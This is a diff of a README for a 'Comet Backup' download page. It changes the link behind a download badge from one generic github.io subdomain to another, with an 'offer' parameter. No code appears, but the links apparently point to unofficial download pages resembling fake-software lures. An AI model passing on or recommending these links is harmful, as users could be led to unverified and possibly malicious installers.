@@ -1,6 +1,6 @@
 # Comet Backup Download — Desktop Data Protection
 
-[![Get Comet Backup GitHub](https://img.shields.io/badge/Get%20Comet%20Backup%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=CometBackup)
+[![Get Comet Backup GitHub](https://img.shields.io/badge/Get%20Comet%20Backup%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-setup.github.io/.github/?offer=CometBackup)
 
 ---
 
